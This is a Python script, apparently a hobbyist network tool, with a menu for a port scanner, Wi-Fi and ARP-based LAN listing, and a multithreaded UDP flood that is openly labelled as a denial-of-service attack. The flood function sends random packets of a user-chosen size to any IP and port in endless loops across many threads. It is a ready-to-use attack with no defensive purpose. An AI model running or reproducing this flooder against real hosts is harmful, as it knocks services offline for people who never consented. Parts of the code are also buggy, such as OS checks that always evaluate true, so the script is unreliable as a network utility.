import sys
import socket
from datetime import datetime
import time
current_time = time.strftime("%Y-%m-%d")
from colorama import Fore
import socket
import random
import sys
import threading
import subprocess
import os
import uuid
import platform



ops = platform.system().lower()



def start():
	print(Fore.BLUE, f'''
		        ▒▒▓▓                                ▒▒▓▓░░      
		        ▓▓░░▓▓                              ▓▓░░▓▓      
		        ▓▓  ▓▓                              ▓▓  ▓▓      
		        ▓▓  ▓▓                              ▓▓  ▓▓      
		        ▓▓  ▓▓                              ▓▓  ▓▓      
		        ▓▓  ▓▓          ▓▓▓▓▓▓▓▓▒▒          ▓▓  ▓▓      
		        ▓▓  ▓▓      ▒▒▓▓▒▒      ▒▒▓▓░░      ▓▓  ▓▓      
		        ▓▓  ▓▓    ▓▓▒▒    ▓▓▓▓▓▓    ▓▓▒▒    ▓▓  ▓▓      
		        ▓▓  ▓▓        ▓▓▒▒      ▒▒▓▓        ▓▓  ▓▓      
		        ▓▓  ▓▓      ▓▓    ▓▓▓▓▓▓  ░░░░      ▓▓  ▓▓      
		        ▓▓  ▓▓          ▓▓▓    ▓░░          ▓▓  ▓▓      
		        ▓▓  ▓▓              ▓░              ▓▓  ▓▓      
		        ██  ▓▓                              ▓▓  ▓▓      
		        ▓▓  ▓▓                              ▓▓  ▓▓      
		  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
		  ▓▓                                                  ▓▓
		  ▓▓▓▓  ▓▓▓▓▓▓  ▓▓▓▓  ▓▓▓▓▓▓  ▓▓▓▓▒▒▒▒▓▓▓▓  ▓▓▓▓▓▓  ▓▓▓▓
		  ▓▓                                                  ▓▓
		  ▓▓                                                  ▓▓
		  ▓▓                                                  ▓▓
		  ▓▓                                                  ▓▓
		  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
		        ▓▓    ▓▓                          ▓▓    ▓▓      
		        ▓▓▓▓▓▓▓▓                          ▓▓▓▓▓▓▓▓      
		''')

	print(Fore.CYAN, 'Date :',current_time)

	print(Fore.YELLOW)
	a = str(f'''
Github Profile: https://github.com/FlynnStratton/
		{print('Your MAC address :',':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
								for ele in range(0, 8 * 6, 8)][::-1]))}
	''')

	a = a.replace('None', '')
	print(a)
	import re



	def port_scanner():
		ip_add_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")

		port_range_pattern = re.compile("([0-9]+)-([0-9]+)")

		port_min = 0
		port_max = 65535
		open_ports = []

		while True:
			ip_add_entered = input("Enter IP to scan : ")
			if ip_add_pattern.search(ip_add_entered):
				print(Fore.GREEN, f"{ip_add_entered} is a valid ip address")
				break
			else:
				print(Fore.RED, 'IP entered is not valid')
				break

		while True:

			port_range = input('Enter port range eg. (10-80) : ')
			port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
			if port_range_valid:
				port_min = int(port_range_valid.group(1))
				port_max = int(port_range_valid.group(2))
				break

		for port in range(port_min, port_max + 1):
			# Connect to socket of target machine. We need the ip address and the port number we want to connect to.
			try:

				with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

					s.settimeout(0.5)

					s.connect((ip_add_entered, port))
					print(Fore.GREEN, f"\nPort {port} is open on {ip_add_entered}.")
					open_ports.append(port)

			except:
				print(Fore.RED, f'Port {port} | Not open')
				pass

		for port in open_ports:
			print(Fore.GREEN, f"Port {port} is open on {ip_add_entered}.")

		

	def net_scan():
		if 'windows' in ops:
			print(Fore.RED,'')
			try:
				network = subprocess.check_output(['netsh', 'wlan', 'show', 'network'])
				networks = network.decode('ascii')
				print(networks)
			except:
				a = (Fore.RED,'[+] There is no wireless interface on the system. Or an error has been found with it')

		else:
			print(Fore.RED, '[+] Your operating system does not support this tool')




	def lan_scan():
		if 'linux' or 'parrot' in ops:
			print(Fore.GREEN)
			data = "arp -a"
			cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
								   stderr=subprocess.PIPE)
			output_byte = cmd.stdout.read() + cmd.stderr.read()
			print(str(output_byte, "utf-8"))

		else:
			print(Fore.RED, '[+]This tool will not be able to run on your system')

		
		if 'windows' or 'mac' in ops:
			data = f"getmac"
			cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
			output_byte = cmd.stdout.read() + cmd.stderr.read()
			print(str(output_byte, "utf-8"))


	def dos():

		def random_phrase():
			ppl = ["Near Shelby", "Sasaki", "sysb1n", "Gr3n0xX", "Quiliarca", "Lucazz Dev", "vl0ne-$", "Xernoboy",
				   "marreta cabeÃ§a de rato", "S4SUK3"]
			phrase = ["was here", "is watching you", "knows your name", "knows your location", "hacked NASA",
					  "hacked FBI",
					  "hacked u", "is looking 4 u", "is right behind you", "has hype"]
			return random.choice(ppl) + " " + random.choice(phrase)

		def DoS(ip, port, size, index):
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			while True:
				sock.sendto(random._urandom(size), (ip, port))
				print(Fore.GREEN, f"THREAD {index} {size} bytes sent to {ip}")

		def main():
			try:
				if sys.version_info[0] != 3:
					print(Fore.RED, "Please use python3")
					sys.exit()

				IP = input("Enter the target ip: ") if len(sys.argv) < 2 else sys.argv[1]
				PORT = int(input("Enter the target port: ")) if len(sys.argv) < 3 else int(
					sys.argv[2])
				SIZE = int(input("Enter the packet size: ")) if len(sys.argv) < 4 else int(
					sys.argv[3])
				COUNT = int(input("Enter how many threads to use: ")) if len(
					sys.argv) < 5 else int(sys.argv[4])

				if PORT > 65535 or PORT < 1:
					print(Fore.RED, "Please, choose a port between 1 and 65535")
					sys.exit(1)

				if SIZE > 65500 or SIZE < 1:
					print(Fore.RED, "Please, choose a size between 1 and 65500")
					sys.exit(1)

			except KeyboardInterrupt:
				print(Fore.LIGHTYELLOW_EX, "Exiting...")
				sys.exit()

			except Exception as e:
				print(Fore.RED, f"[ERROR] {e}")
				sys.exit()

			for i in range(COUNT):
				try:
					t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
					t.start()
				except Exception as e:
					print(Fore.RED, f"An error ocurred initializing thread {i}: {e}")

		if __name__ == "__main__":
			main()

		


	def menu():
		print(Fore.GREEN,'''
             --help  |    Show this menu

  Port scanner 
		-ps  |    Port scanner eg. python NAT.py -ps (or --portscanner)

  LAN scan
		-lS  |    LAN (local area network) scan eg. (python NAT.py -ls)
			
  Network scanner
		-ns  |    Network scanner
		
  Denial Of service 
  		-dos |    DOS attack (only on network0''')
		print(Fore.RED, '  		-DOS |    DOS attack from anywhere (coming soon)')





	try:
		command = sys.argv[1]


		if command == '-ps':
			port_scanner()

		elif command == '--help':
			menu()

		elif command == '-ns':
			net_scan()

		elif command == '-ls':
			lan_scan()

		elif command == '-dos':
			dos()


		else:
			menu()

	except IndexError:
		menu()





if 'linux' in ops:
	os.system('clear')
	start()

elif 'windows' in ops:
	os.system('cls')
	print(Fore.RED, f'Some tools may not be available due to your operating system | OS - {ops}')
	start()

elif 'parrot' in ops:
	os.system('clear')
	print(Fore.RED, f'Some tools may not be available due to your operating system | OS - {ops}')
	start()

else:
	print(Fore.RED, f'Operating System - {ops} is not usable')


print(Fore.RESET)



